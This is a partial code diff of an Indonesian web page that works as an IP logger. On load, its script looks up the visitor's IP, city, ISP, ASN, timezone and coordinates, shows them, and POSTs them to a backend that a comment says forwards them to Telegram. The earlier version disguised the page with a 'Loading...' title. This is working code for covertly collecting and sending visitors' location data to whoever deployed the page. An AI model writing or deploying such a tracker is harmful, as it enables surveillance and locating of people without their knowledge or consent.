@@ -2,10 +2,10 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8" />
-  <title>Loading...</title>
+  <title>Melacak IP...</title>
 </head>
 <body>
-  <h3 id="status">Mohon tunggu...</h3>
+  <h3 id="status">🔎 Melacak lokasi...</h3>
   <pre id="result"></pre>
 
   <script>
@@ -15,28 +15,41 @@
         const data = await res.json();
 
         const info = `
-📡 <b>IP Terdeteksi</b>
-🌐 <b>IP:</b> ${data.ip}
+🌐 <b>Hasil Pelacakan IP</b>
+
+📍 <b>IP:</b> ${data.ip}
 🌍 <b>Negara:</b> ${data.country_name}
-🏙 <b>Kota:</b> ${data.city}, ${data.region} ${data.postal}
+🏙 <b>Kota:</b> ${data.city}, ${data.region}
 🛰 <b>ISP:</b> ${data.org}
+🏢 <b>Org:</b> ${data.org}
+⚡ <b>ASN:</b> ${data.asn}
 ⌚ <b>Zona Waktu:</b> ${data.timezone}
 📌 <b>Koordinat:</b> ${data.latitude}, ${data.longitude}
+
 🔗 <a href="https://www.google.com/maps?q=${data.latitude},${data.longitude}">Lihat di Maps</a>
         `.trim();
 
-        document.getElementById("status").textContent = "✅ Data berhasil diambil";
+        // Tampilkan ke user
+        document.getElementById("status").textContent = "✅ IP berhasil dilacak";
         document.getElementById("result").textContent = info;
 
-        await fetch("/api/send", {
+        // Kirim ke Telegram via API backend
+        const send = await fetch("/api/send", {
           method: "POST",
-          headers: { "Content-Type": "application/json" },
+          headers: {
+            "Content-Type": "application/json"
+          },
           body: JSON.stringify({ text: info })
         });
 
+        const result = await send.json();
+        if (!result.ok) {
+          console.error("Gagal kirim ke Telegram:", result);
+        }
+
       } catch (err) {
-        document.getElementById("status").textContent = "❌ Gagal ambil data";
-        console.error("Gagal ambil atau kirim data:", err);
+        document.getElementById("status").textContent = "❌ Gagal melacak IP";
+        console.error("ERROR:", err);
       }
     }
 
